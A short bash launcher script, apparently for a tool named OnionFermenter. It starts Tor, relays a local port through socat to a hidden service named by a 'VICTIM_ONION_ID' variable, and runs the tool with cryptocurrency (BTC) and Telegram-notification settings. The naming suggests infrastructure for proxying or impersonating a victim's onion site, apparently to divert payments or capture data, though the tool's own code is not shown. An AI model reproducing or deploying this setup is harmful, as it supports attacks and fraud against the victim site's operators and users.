#!/bin/bash

# Trap signals for proper shutdown
trap 'kill $(jobs -p); exit' SIGTERM SIGINT

# Start tor
tor &
TOR_PID=$!

# Wait a bit for tor to initialize
sleep 5

# Start socat to connect transparently through TOR socks proxy
socat TCP4-LISTEN:8081,fork,reuseaddr SOCKS4A:127.0.0.1:${VICTIM_ONION_ID}.onion:80,socksport=9050 &
SOCAT_PID=$!

# Start OF
/onionfermenter/bin/onionfermenter foreground &
OF_PID=$!

echo "OnionFermenter started with PIDs: TOR=$TOR_PID SOCAT=$SOCAT_PID OF=$OF_PID"
echo "Currency type: ${CURRENCY_TYPE:-BTC}"
echo "Telegram notifications: ${TELEGRAM_BOT_TOKEN:+ENABLED}"

# Wait for any process to exit
wait -n

# Exit with status of process that exited first
exit $?